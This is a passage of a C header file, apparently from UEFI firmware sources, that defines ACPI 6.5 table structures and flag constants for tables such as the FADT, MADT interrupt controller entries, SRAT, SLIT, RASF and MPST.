    UINT16                                    IaPcBootArch;
    UINT8                                     Reserved1;
    UINT32                                    Flags;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    ResetReg;
    UINT8                                     ResetValue;
    UINT16                                    ArmBootArch;
    UINT8                                     MinorVersion;
    UINT64                                    XFirmwareCtrl;
    UINT64                                    XDsdt;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    XPm1aEvtBlk;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    XPm1bEvtBlk;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    XPm1aCntBlk;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    XPm1bCntBlk;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    XPm2CntBlk;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    XPmTmrBlk;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    XGpe0Blk;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    XGpe1Blk;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    SleepControlReg;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    SleepStatusReg;
    UINT64                                    HypervisorVendorIdentity;
} EFI_ACPI_6_5_FIXED_ACPI_DESCRIPTION_TABLE;

///
/// FADT Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_FIXED_ACPI_DESCRIPTION_TABLE_REVISION        0x06
#define EFI_ACPI_6_5_FIXED_ACPI_DESCRIPTION_TABLE_MINOR_REVISION  0x05

//
// Fixed ACPI Description Table Preferred Power Management Profile
//
#define EFI_ACPI_6_5_PM_PROFILE_UNSPECIFIED         0
#define EFI_ACPI_6_5_PM_PROFILE_DESKTOP             1
#define EFI_ACPI_6_5_PM_PROFILE_MOBILE              2
#define EFI_ACPI_6_5_PM_PROFILE_WORKSTATION         3
#define EFI_ACPI_6_5_PM_PROFILE_ENTERPRISE_SERVER   4
#define EFI_ACPI_6_5_PM_PROFILE_SOHO_SERVER         5
#define EFI_ACPI_6_5_PM_PROFILE_APPLIANCE_PC        6
#define EFI_ACPI_6_5_PM_PROFILE_PERFORMANCE_SERVER  7
#define EFI_ACPI_6_5_PM_PROFILE_TABLET              8

//
// Fixed ACPI Description Table Boot Architecture Flags
// All other bits are reserved and must be set to 0.
//
#define EFI_ACPI_6_5_LEGACY_DEVICES        BIT0
#define EFI_ACPI_6_5_8042                  BIT1
#define EFI_ACPI_6_5_VGA_NOT_PRESENT       BIT2
#define EFI_ACPI_6_5_MSI_NOT_SUPPORTED     BIT3
#define EFI_ACPI_6_5_PCIE_ASPM_CONTROLS    BIT4
#define EFI_ACPI_6_5_CMOS_RTC_NOT_PRESENT  BIT5

//
// Fixed ACPI Description Table Arm Boot Architecture Flags
// All other bits are reserved and must be set to 0.
//
#define EFI_ACPI_6_5_ARM_PSCI_COMPLIANT  BIT0
#define EFI_ACPI_6_5_ARM_PSCI_USE_HVC    BIT1

//
// Fixed ACPI Description Table Fixed Feature Flags
// All other bits are reserved and must be set to 0.
//
#define EFI_ACPI_6_5_WBINVD                                BIT0
#define EFI_ACPI_6_5_WBINVD_FLUSH                          BIT1
#define EFI_ACPI_6_5_PROC_C1                               BIT2
#define EFI_ACPI_6_5_P_LVL2_UP                             BIT3
#define EFI_ACPI_6_5_PWR_BUTTON                            BIT4
#define EFI_ACPI_6_5_SLP_BUTTON                            BIT5
#define EFI_ACPI_6_5_FIX_RTC                               BIT6
#define EFI_ACPI_6_5_RTC_S4                                BIT7
#define EFI_ACPI_6_5_TMR_VAL_EXT                           BIT8
#define EFI_ACPI_6_5_DCK_CAP                               BIT9
#define EFI_ACPI_6_5_RESET_REG_SUP                         BIT10
#define EFI_ACPI_6_5_SEALED_CASE                           BIT11
#define EFI_ACPI_6_5_HEADLESS                              BIT12
#define EFI_ACPI_6_5_CPU_SW_SLP                            BIT13
#define EFI_ACPI_6_5_PCI_EXP_WAK                           BIT14
#define EFI_ACPI_6_5_USE_PLATFORM_CLOCK                    BIT15
#define EFI_ACPI_6_5_S4_RTC_STS_VALID                      BIT16
#define EFI_ACPI_6_5_REMOTE_POWER_ON_CAPABLE               BIT17
#define EFI_ACPI_6_5_FORCE_APIC_CLUSTER_MODEL              BIT18
#define EFI_ACPI_6_5_FORCE_APIC_PHYSICAL_DESTINATION_MODE  BIT19
#define EFI_ACPI_6_5_HW_REDUCED_ACPI                       BIT20
#define EFI_ACPI_6_5_LOW_POWER_S0_IDLE_CAPABLE             BIT21

///
/// Firmware ACPI Control Structure
///
typedef struct {
    UINT32    Signature;
    UINT32    Length;
    UINT32    HardwareSignature;
    UINT32    FirmwareWakingVector;
    UINT32    GlobalLock;
    UINT32    Flags;
    UINT64    XFirmwareWakingVector;
    UINT8     Version;
    UINT8     Reserved0[3];
    UINT32    OspmFlags;
    UINT8     Reserved1[24];
} EFI_ACPI_6_5_FIRMWARE_ACPI_CONTROL_STRUCTURE;

///
/// FACS Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_FIRMWARE_ACPI_CONTROL_STRUCTURE_VERSION  0x02

///
/// Firmware Control Structure Feature Flags
/// All other bits are reserved and must be set to 0.
///
#define EFI_ACPI_6_5_S4BIOS_F                BIT0
#define EFI_ACPI_6_5_64BIT_WAKE_SUPPORTED_F  BIT1

///
/// OSPM Enabled Firmware Control Structure Flags
/// All other bits are reserved and must be set to 0.
///
#define EFI_ACPI_6_5_OSPM_64BIT_WAKE_F  BIT0

//
// Differentiated System Description Table,
// Secondary System Description Table
// and Persistent System Description Table,
// no definition needed as they are common description table header, the same with
// EFI_ACPI_DESCRIPTION_HEADER, followed by a definition block.
//
#define EFI_ACPI_6_5_DIFFERENTIATED_SYSTEM_DESCRIPTION_TABLE_REVISION  0x02
#define EFI_ACPI_6_5_SECONDARY_SYSTEM_DESCRIPTION_TABLE_REVISION       0x02

///
/// Multiple APIC Description Table header definition.  The rest of the table
/// must be defined in a platform specific manner.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         LocalApicAddress;
    UINT32                         Flags;
} EFI_ACPI_6_5_MULTIPLE_APIC_DESCRIPTION_TABLE_HEADER;

///
/// MADT Revision (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_MULTIPLE_APIC_DESCRIPTION_TABLE_REVISION  0x06

///
/// Multiple APIC Flags
/// All other bits are reserved and must be set to 0.
///
#define EFI_ACPI_6_5_PCAT_COMPAT  BIT0

//
// Multiple APIC Description Table APIC structure types
// All other values between 0x18 and 0x7F are reserved and
// will be ignored by OSPM. 0x80 ~ 0xFF are reserved for OEM.
//
#define EFI_ACPI_6_5_PROCESSOR_LOCAL_APIC           0x00
#define EFI_ACPI_6_5_IO_APIC                        0x01
#define EFI_ACPI_6_5_INTERRUPT_SOURCE_OVERRIDE      0x02
#define EFI_ACPI_6_5_NON_MASKABLE_INTERRUPT_SOURCE  0x03
#define EFI_ACPI_6_5_LOCAL_APIC_NMI                 0x04
#define EFI_ACPI_6_5_LOCAL_APIC_ADDRESS_OVERRIDE    0x05
#define EFI_ACPI_6_5_IO_SAPIC                       0x06
#define EFI_ACPI_6_5_LOCAL_SAPIC                    0x07
#define EFI_ACPI_6_5_PLATFORM_INTERRUPT_SOURCES     0x08
#define EFI_ACPI_6_5_PROCESSOR_LOCAL_X2APIC         0x09
#define EFI_ACPI_6_5_LOCAL_X2APIC_NMI               0x0A
#define EFI_ACPI_6_5_GIC                            0x0B
#define EFI_ACPI_6_5_GICD                           0x0C
#define EFI_ACPI_6_5_GIC_MSI_FRAME                  0x0D
#define EFI_ACPI_6_5_GICR                           0x0E
#define EFI_ACPI_6_5_GIC_ITS                        0x0F
#define EFI_ACPI_6_5_MULTIPROCESSOR_WAKEUP          0x10
#define EFI_ACPI_6_5_CORE_PIC                       0x11
#define EFI_ACPI_6_5_LIO_PIC                        0x12
#define EFI_ACPI_6_5_HT_PIC                         0x13
#define EFI_ACPI_6_5_EIO_PIC                        0x14
#define EFI_ACPI_6_5_MSI_PIC                        0x15
#define EFI_ACPI_6_5_BIO_PIC                        0x16
#define EFI_ACPI_6_5_LPC_PIC                        0x17

//
// APIC Structure Definitions
//

///
/// Processor Local APIC Structure Definition
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     AcpiProcessorUid;
    UINT8     ApicId;
    UINT32    Flags;
} EFI_ACPI_6_5_PROCESSOR_LOCAL_APIC_STRUCTURE;

///
/// Local APIC Flags.  All other bits are reserved and must be 0.
///
#define EFI_ACPI_6_5_LOCAL_APIC_ENABLED         BIT0
#define EFI_ACPI_6_5_LOCAL_APIC_ONLINE_CAPABLE  BIT1

///
/// IO APIC Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     IoApicId;
    UINT8     Reserved;
    UINT32    IoApicAddress;
    UINT32    GlobalSystemInterruptBase;
} EFI_ACPI_6_5_IO_APIC_STRUCTURE;

///
/// Interrupt Source Override Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Bus;
    UINT8     Source;
    UINT32    GlobalSystemInterrupt;
    UINT16    Flags;
} EFI_ACPI_6_5_INTERRUPT_SOURCE_OVERRIDE_STRUCTURE;

///
/// Platform Interrupt Sources Structure Definition
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Flags;
    UINT8     InterruptType;
    UINT8     ProcessorId;
    UINT8     ProcessorEid;
    UINT8     IoSapicVector;
    UINT32    GlobalSystemInterrupt;
    UINT32    PlatformInterruptSourceFlags;
    UINT8     CpeiProcessorOverride;
    UINT8     Reserved[31];
} EFI_ACPI_6_5_PLATFORM_INTERRUPT_APIC_STRUCTURE;

//
// MPS INTI flags.
// All other bits are reserved and must be set to 0.
//
#define EFI_ACPI_6_5_POLARITY      (3 << 0)
#define EFI_ACPI_6_5_TRIGGER_MODE  (3 << 2)

///
/// Non-Maskable Interrupt Source Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Flags;
    UINT32    GlobalSystemInterrupt;
} EFI_ACPI_6_5_NON_MASKABLE_INTERRUPT_SOURCE_STRUCTURE;

///
/// Local APIC NMI Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     AcpiProcessorUid;
    UINT16    Flags;
    UINT8     LocalApicLint;
} EFI_ACPI_6_5_LOCAL_APIC_NMI_STRUCTURE;

///
/// Local APIC Address Override Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Reserved;
    UINT64    LocalApicAddress;
} EFI_ACPI_6_5_LOCAL_APIC_ADDRESS_OVERRIDE_STRUCTURE;

///
/// IO SAPIC Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     IoApicId;
    UINT8     Reserved;
    UINT32    GlobalSystemInterruptBase;
    UINT64    IoSapicAddress;
} EFI_ACPI_6_5_IO_SAPIC_STRUCTURE;

///
/// Local SAPIC Structure
/// This struct followed by a null-terminated ASCII string - ACPI Processor UID String
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     AcpiProcessorId;
    UINT8     LocalSapicId;
    UINT8     LocalSapicEid;
    UINT8     Reserved[3];
    UINT32    Flags;
    UINT32    ACPIProcessorUIDValue;
} EFI_ACPI_6_5_PROCESSOR_LOCAL_SAPIC_STRUCTURE;

///
/// Platform Interrupt Sources Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Flags;
    UINT8     InterruptType;
    UINT8     ProcessorId;
    UINT8     ProcessorEid;
    UINT8     IoSapicVector;
    UINT32    GlobalSystemInterrupt;
    UINT32    PlatformInterruptSourceFlags;
} EFI_ACPI_6_5_PLATFORM_INTERRUPT_SOURCES_STRUCTURE;

///
/// Platform Interrupt Source Flags.
/// All other bits are reserved and must be set to 0.
///
#define EFI_ACPI_6_5_CPEI_PROCESSOR_OVERRIDE  BIT0

///
/// Processor Local x2APIC Structure Definition
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Reserved[2];
    UINT32    X2ApicId;
    UINT32    Flags;
    UINT32    AcpiProcessorUid;
} EFI_ACPI_6_5_PROCESSOR_LOCAL_X2APIC_STRUCTURE;

///
/// Local x2APIC NMI Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Flags;
    UINT32    AcpiProcessorUid;
    UINT8     LocalX2ApicLint;
    UINT8     Reserved[3];
} EFI_ACPI_6_5_LOCAL_X2APIC_NMI_STRUCTURE;

///
/// GIC Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Reserved;
    UINT32    CPUInterfaceNumber;
    UINT32    AcpiProcessorUid;
    UINT32    Flags;
    UINT32    ParkingProtocolVersion;
    UINT32    PerformanceInterruptGsiv;
    UINT64    ParkedAddress;
    UINT64    PhysicalBaseAddress;
    UINT64    GICV;
    UINT64    GICH;
    UINT32    VGICMaintenanceInterrupt;
    UINT64    GICRBaseAddress;
    UINT64    MPIDR;
    UINT8     ProcessorPowerEfficiencyClass;
    UINT8     Reserved2;
    UINT16    SpeOverflowInterrupt;
} EFI_ACPI_6_5_GIC_STRUCTURE;

///
/// GIC Flags.  All other bits are reserved and must be 0.
///
#define EFI_ACPI_6_5_GIC_ENABLED                            BIT0
#define EFI_ACPI_6_5_PERFORMANCE_INTERRUPT_MODEL            BIT1
#define EFI_ACPI_6_5_VGIC_MAINTENANCE_INTERRUPT_MODE_FLAGS  BIT2

///
/// GIC Distributor Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Reserved1;
    UINT32    GicId;
    UINT64    PhysicalBaseAddress;
    UINT32    SystemVectorBase;
    UINT8     GicVersion;
    UINT8     Reserved2[3];
} EFI_ACPI_6_5_GIC_DISTRIBUTOR_STRUCTURE;

///
/// GIC Version
///
#define EFI_ACPI_6_5_GIC_V1  0x01
#define EFI_ACPI_6_5_GIC_V2  0x02
#define EFI_ACPI_6_5_GIC_V3  0x03
#define EFI_ACPI_6_5_GIC_V4  0x04

///
/// GIC MSI Frame Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Reserved1;
    UINT32    GicMsiFrameId;
    UINT64    PhysicalBaseAddress;
    UINT32    Flags;
    UINT16    SPICount;
    UINT16    SPIBase;
} EFI_ACPI_6_5_GIC_MSI_FRAME_STRUCTURE;

///
/// GIC MSI Frame Flags.  All other bits are reserved and must be 0.
///
#define EFI_ACPI_6_5_SPI_COUNT_BASE_SELECT  BIT0

///
/// GICR Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Reserved;
    UINT64    DiscoveryRangeBaseAddress;
    UINT32    DiscoveryRangeLength;
} EFI_ACPI_6_5_GICR_STRUCTURE;

///
/// GIC Interrupt Translation Service Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Reserved;
    UINT32    GicItsId;
    UINT64    PhysicalBaseAddress;
    UINT32    Reserved2;
} EFI_ACPI_6_5_GIC_ITS_STRUCTURE;

///
/// Multiprocessor Wakeup Structure
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    MailBoxVersion;
    UINT32    Reserved;
    UINT64    MailBoxAddress;
} EFI_ACPI_6_5_MULTIPROCESSOR_WAKEUP_STRUCTURE;

///
/// Multiprocessor Wakeup Mailbox Structure
///
typedef struct {
    UINT16    Command;
    UINT16    Reserved;
    UINT32    AcpiId;
    UINT64    WakeupVector;
    UINT8     ReservedForOs[2032];
    UINT8     ReservedForFirmware[2048];
} EFI_ACPI_6_5_MULTIPROCESSOR_WAKEUP_MAILBOX_STRUCTURE;

#define EFI_ACPI_6_5_MULTIPROCESSOR_WAKEUP_MAILBOX_COMMAND_NOOP    0x0000
#define EFI_ACPI_6_5_MULTIPROCESSOR_WAKEUP_MAILBOX_COMMAND_WAKEUP  0x0001

///
/// Core Programmable Interrupt Controller
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Version;
    UINT32    ProcessorId;
    UINT32    CoreId;
    UINT32    Flags;
} EFI_ACPI_6_5_CORE_PIC_STRUCTURE;

///
/// Legacy I/O Programmable Interrupt Controller
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Version;
    UINT64    Address;
    UINT16    Size;
    UINT8     Cascade[2];
    UINT32    CascadeMap[2];
} EFI_ACPI_6_5_LIO_PIC_STRUCTURE;

///
/// HyperTransport Programmable Interrupt Controller
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Version;
    UINT64    Address;
    UINT16    Size;
    UINT8     Cascade[8];
} EFI_ACPI_6_5_HT_PIC_STRUCTURE;

///
/// Extend I/O Programmable Interrupt Controller
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Version;
    UINT8     Cascade;
    UINT8     Node;
    UINT64    NodeMap;
} EFI_ACPI_6_5_EIO_PIC_STRUCTURE;

///
/// MSI Programmable Interrupt Controller
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Version;
    UINT64    MsgAddress;
    UINT32    Start;
    UINT32    Count;
} EFI_ACPI_6_5_MSI_PIC_STRUCTURE;

///
/// Bridge I/O Programmable Interrupt Controller
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Version;
    UINT64    Address;
    UINT16    Size;
    UINT16    Id;
    UINT16    GsiBase;
} EFI_ACPI_6_5_BIO_PIC_STRUCTURE;

///
/// Low Pin Count Programmable Interrupt Controller
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Version;
    UINT64    Address;
    UINT16    Size;
    UINT8     Cascade;
} EFI_ACPI_6_5_LPC_PIC_STRUCTURE;

///
/// Smart Battery Description Table (SBST)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         WarningEnergyLevel;
    UINT32                         LowEnergyLevel;
    UINT32                         CriticalEnergyLevel;
} EFI_ACPI_6_5_SMART_BATTERY_DESCRIPTION_TABLE;

///
/// SBST Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_SMART_BATTERY_DESCRIPTION_TABLE_REVISION  0x01

///
/// Embedded Controller Boot Resources Table (ECDT)
/// The table is followed by a null terminated ASCII string that contains
/// a fully qualified reference to the name space object.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER               Header;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    EcControl;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    EcData;
    UINT32                                    Uid;
    UINT8                                     GpeBit;
} EFI_ACPI_6_5_EMBEDDED_CONTROLLER_BOOT_RESOURCES_TABLE;

///
/// ECDT Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_EMBEDDED_CONTROLLER_BOOT_RESOURCES_TABLE_REVISION  0x01

///
/// System Resource Affinity Table (SRAT).  The rest of the table
/// must be defined in a platform specific manner.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         Reserved1; ///< Must be set to 1
    UINT64                         Reserved2;
} EFI_ACPI_6_5_SYSTEM_RESOURCE_AFFINITY_TABLE_HEADER;

///
/// SRAT Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_SYSTEM_RESOURCE_AFFINITY_TABLE_REVISION  0x03

//
// SRAT structure types.
// All other values between 0x06 an 0xFF are reserved and
// will be ignored by OSPM.
//
#define EFI_ACPI_6_5_PROCESSOR_LOCAL_APIC_SAPIC_AFFINITY  0x00
#define EFI_ACPI_6_5_MEMORY_AFFINITY                      0x01
#define EFI_ACPI_6_5_PROCESSOR_LOCAL_X2APIC_AFFINITY      0x02
#define EFI_ACPI_6_5_GICC_AFFINITY                        0x03
#define EFI_ACPI_6_5_GIC_ITS_AFFINITY                     0x04
#define EFI_ACPI_6_5_GENERIC_INITIATOR_AFFINITY           0x05

///
/// Processor Local APIC/SAPIC Affinity Structure Definition
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     ProximityDomain7To0;
    UINT8     ApicId;
    UINT32    Flags;
    UINT8     LocalSapicEid;
    UINT8     ProximityDomain31To8[3];
    UINT32    ClockDomain;
} EFI_ACPI_6_5_PROCESSOR_LOCAL_APIC_SAPIC_AFFINITY_STRUCTURE;

///
/// Local APIC/SAPIC Flags.  All other bits are reserved and must be 0.
///
#define EFI_ACPI_6_5_PROCESSOR_LOCAL_APIC_SAPIC_ENABLED  (1 << 0)

///
/// Memory Affinity Structure Definition
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT32    ProximityDomain;
    UINT16    Reserved1;
    UINT32    AddressBaseLow;
    UINT32    AddressBaseHigh;
    UINT32    LengthLow;
    UINT32    LengthHigh;
    UINT32    Reserved2;
    UINT32    Flags;
    UINT64    Reserved3;
} EFI_ACPI_6_5_MEMORY_AFFINITY_STRUCTURE;

//
// Memory Flags.  All other bits are reserved and must be 0.
//
#define EFI_ACPI_6_5_MEMORY_ENABLED        (1 << 0)
#define EFI_ACPI_6_5_MEMORY_HOT_PLUGGABLE  (1 << 1)
#define EFI_ACPI_6_5_MEMORY_NONVOLATILE    (1 << 2)

///
/// Processor Local x2APIC Affinity Structure Definition
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Reserved1[2];
    UINT32    ProximityDomain;
    UINT32    X2ApicId;
    UINT32    Flags;
    UINT32    ClockDomain;
    UINT8     Reserved2[4];
} EFI_ACPI_6_5_PROCESSOR_LOCAL_X2APIC_AFFINITY_STRUCTURE;

///
/// GICC Affinity Structure Definition
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT32    ProximityDomain;
    UINT32    AcpiProcessorUid;
    UINT32    Flags;
    UINT32    ClockDomain;
} EFI_ACPI_6_5_GICC_AFFINITY_STRUCTURE;

///
/// GICC Flags.  All other bits are reserved and must be 0.
///
#define EFI_ACPI_6_5_GICC_ENABLED  (1 << 0)

///
/// GIC Interrupt Translation Service (ITS) Affinity Structure Definition
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT32    ProximityDomain;
    UINT8     Reserved[2];
    UINT32    ItsId;
} EFI_ACPI_6_5_GIC_ITS_AFFINITY_STRUCTURE;

//
// Generic Initiator Affinity Structure Device Handle Types
// All other values between 0x02 an 0xFF are reserved and
// will be ignored by OSPM.
//
#define EFI_ACPI_6_5_ACPI_DEVICE_HANDLE  0x00
#define EFI_ACPI_6_5_PCI_DEVICE_HANDLE   0x01

///
/// Device Handle - ACPI
///
typedef struct {
    UINT64    AcpiHid;
    UINT32    AcpiUid;
    UINT8     Reserved[4];
} EFI_ACPI_6_5_DEVICE_HANDLE_ACPI;

///
/// Device Handle - PCI
///
typedef struct {
    UINT16    PciSegment;
    UINT16    PciBdfNumber;
    UINT8     Reserved[12];
} EFI_ACPI_6_5_DEVICE_HANDLE_PCI;

///
/// Device Handle
///
typedef union {
    EFI_ACPI_6_5_DEVICE_HANDLE_ACPI    Acpi;
    EFI_ACPI_6_5_DEVICE_HANDLE_PCI     Pci;
} EFI_ACPI_6_5_DEVICE_HANDLE;

///
/// Generic Initiator Affinity Structure
///
typedef struct {
    UINT8                         Type;
    UINT8                         Length;
    UINT8                         Reserved1;
    UINT8                         DeviceHandleType;
    UINT32                        ProximityDomain;
    EFI_ACPI_6_5_DEVICE_HANDLE    DeviceHandle;
    UINT32                        Flags;
    UINT8                         Reserved2[4];
} EFI_ACPI_6_5_GENERIC_INITIATOR_AFFINITY_STRUCTURE;

///
/// Generic Initiator Affinity Structure Flags. All other bits are reserved
/// and must be 0.
///
#define EFI_ACPI_6_5_GENERIC_INITIATOR_AFFINITY_STRUCTURE_ENABLED                     BIT0
#define EFI_ACPI_6_5_GENERIC_INITIATOR_AFFINITY_STRUCTURE_ARCHITECTURAL_TRANSACTIONS  BIT1

///
/// System Locality Distance Information Table (SLIT).
/// The rest of the table is a matrix.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT64                         NumberOfSystemLocalities;
} EFI_ACPI_6_5_SYSTEM_LOCALITY_DISTANCE_INFORMATION_TABLE_HEADER;

///
/// SLIT Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_SYSTEM_LOCALITY_DISTANCE_INFORMATION_TABLE_REVISION  0x01

///
/// Corrected Platform Error Polling Table (CPEP)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT8                          Reserved[8];
} EFI_ACPI_6_5_CORRECTED_PLATFORM_ERROR_POLLING_TABLE_HEADER;

///
/// CPEP Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_CORRECTED_PLATFORM_ERROR_POLLING_TABLE_REVISION  0x01

//
// CPEP processor structure types.
//
#define EFI_ACPI_6_5_CPEP_PROCESSOR_APIC_SAPIC  0x00

///
/// Corrected Platform Error Polling Processor Structure Definition
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     ProcessorId;
    UINT8     ProcessorEid;
    UINT32    PollingInterval;
} EFI_ACPI_6_5_CPEP_PROCESSOR_APIC_SAPIC_STRUCTURE;

///
/// Maximum System Characteristics Table (MSCT)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         OffsetProxDomInfo;
    UINT32                         MaximumNumberOfProximityDomains;
    UINT32                         MaximumNumberOfClockDomains;
    UINT64                         MaximumPhysicalAddress;
} EFI_ACPI_6_5_MAXIMUM_SYSTEM_CHARACTERISTICS_TABLE_HEADER;

///
/// MSCT Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_MAXIMUM_SYSTEM_CHARACTERISTICS_TABLE_REVISION  0x01

///
/// Maximum Proximity Domain Information Structure Definition
///
typedef struct {
    UINT8     Revision;
    UINT8     Length;
    UINT32    ProximityDomainRangeLow;
    UINT32    ProximityDomainRangeHigh;
    UINT32    MaximumProcessorCapacity;
    UINT64    MaximumMemoryCapacity;
} EFI_ACPI_6_5_MAXIMUM_PROXIMITY_DOMAIN_INFORMATION_STRUCTURE;

///
/// ACPI RAS Feature Table definition.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT8                          PlatformCommunicationChannelIdentifier[12];
} EFI_ACPI_6_5_RAS_FEATURE_TABLE;

///
/// RASF Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_RAS_FEATURE_TABLE_REVISION  0x01

///
/// ACPI RASF Platform Communication Channel Shared Memory Region definition.
///
typedef struct {
    UINT32    Signature;
    UINT16    Command;
    UINT16    Status;
    UINT16    Version;
    UINT8     RASCapabilities[16];
    UINT8     SetRASCapabilities[16];
    UINT16    NumberOfRASFParameterBlocks;
    UINT32    SetRASCapabilitiesStatus;
} EFI_ACPI_6_5_RASF_PLATFORM_COMMUNICATION_CHANNEL_SHARED_MEMORY_REGION;

///
/// ACPI RASF PCC command code
///
#define EFI_ACPI_6_5_RASF_PCC_COMMAND_CODE_EXECUTE_RASF_COMMAND  0x01

///
/// ACPI RASF Platform RAS Capabilities
///
#define EFI_ACPI_6_5_RASF_PLATFORM_RAS_CAPABILITY_HARDWARE_BASED_PATROL_SCRUB_SUPPORTED                          BIT0
#define EFI_ACPI_6_5_RASF_PLATFORM_RAS_CAPABILITY_HARDWARE_BASED_PATROL_SCRUB_SUPPORTED_AND_EXPOSED_TO_SOFTWARE  BIT1
#define EFI_ACPI_6_5_RASF_PLATFORM_RAS_CAPABILITY_CPU_CACHE_FLUSH_TO_NVDIMM_DURABILITY_ON_POWER_LOSS             BIT2
#define EFI_ACPI_6_5_RASF_PLATFORM_RAS_CAPABILITY_MEMORY_CONTROLLER_FLUSH_TO_NVDIMM_DURABILITY_ON_POWER_LOSS     BIT3
#define EFI_ACPI_6_5_RASF_PLATFORM_RAS_CAPABILITY_BYTE_ADDRESSABLE_PERSISTENT_MEMORY_HARDWARE_MIRRORING          BIT4

///
/// ACPI RASF Parameter Block structure for PATROL_SCRUB
///
typedef struct {
    UINT16    Type;
    UINT16    Version;
    UINT16    Length;
    UINT16    PatrolScrubCommand;
    UINT64    RequestedAddressRange[2];
    UINT64    ActualAddressRange[2];
    UINT16    Flags;
    UINT8     RequestedSpeed;
} EFI_ACPI_6_5_RASF_PATROL_SCRUB_PLATFORM_BLOCK_STRUCTURE;

///
/// ACPI RASF Patrol Scrub command
///
#define EFI_ACPI_6_5_RASF_PATROL_SCRUB_COMMAND_GET_PATROL_PARAMETERS  0x01
#define EFI_ACPI_6_5_RASF_PATROL_SCRUB_COMMAND_START_PATROL_SCRUBBER  0x02
#define EFI_ACPI_6_5_RASF_PATROL_SCRUB_COMMAND_STOP_PATROL_SCRUBBER   0x03

///
/// Memory Power State Table definition.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT8                          PlatformCommunicationChannelIdentifier;
    UINT8                          Reserved[3];
    // Memory Power Node Structure
    // Memory Power State Characteristics
} EFI_ACPI_6_5_MEMORY_POWER_STATUS_TABLE;

///
/// MPST Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_MEMORY_POWER_STATE_TABLE_REVISION  0x01

///
/// MPST Platform Communication Channel Shared Memory Region definition.
///
typedef struct {
    UINT32    Signature;
    UINT16    Command;
    UINT16    Status;
    UINT32    MemoryPowerCommandRegister;
    UINT32    MemoryPowerStatusRegister;
    UINT32    PowerStateId;
    UINT32    MemoryPowerNodeId;
    UINT64    MemoryEnergyConsumed;
    UINT64    ExpectedAveragePowerComsuned;
} EFI_ACPI_6_5_MPST_PLATFORM_COMMUNICATION_CHANNEL_SHARED_MEMORY_REGION;

///
/// ACPI MPST PCC command code
///
